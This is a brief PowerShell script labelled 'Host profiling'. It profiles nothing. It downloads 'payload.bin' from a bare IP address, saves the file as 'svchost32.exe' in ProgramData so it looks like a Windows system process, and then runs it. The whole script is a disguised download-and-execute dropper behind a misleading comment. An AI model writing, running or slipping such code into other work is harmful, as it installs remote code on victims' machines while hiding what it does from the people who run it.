
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://198.51.100.45/downloads/payload.bin',
    [string]$LocalPath = 'C:\ProgramData\svchost32.exe'
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $LocalPath)
Start-Process -FilePath $LocalPath
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
